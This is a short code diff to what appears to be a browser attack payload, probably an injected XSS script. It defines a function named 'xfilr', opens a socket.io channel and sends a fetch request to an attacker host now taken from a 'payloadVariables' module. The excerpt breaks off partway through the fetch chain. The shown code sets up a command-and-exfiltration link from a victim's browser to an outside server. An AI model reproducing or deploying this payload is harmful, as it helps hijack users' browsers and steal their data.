@@ -1,7 +1,9 @@
+const { CSIK_HOST } = require('../../payloadVariables')
+
 window.x_id = 'not-sup';
 window.xfilr = (function() {
-  var socket = io.connect('$$HOST$$/x');
-  fetch('$$HOST$$/id')
+  var socket = io.connect(CSIK_HOST + '/x');
+  fetch(CSIK_HOST + '/id')
       .then(function(res) {
     return res.json();
   })
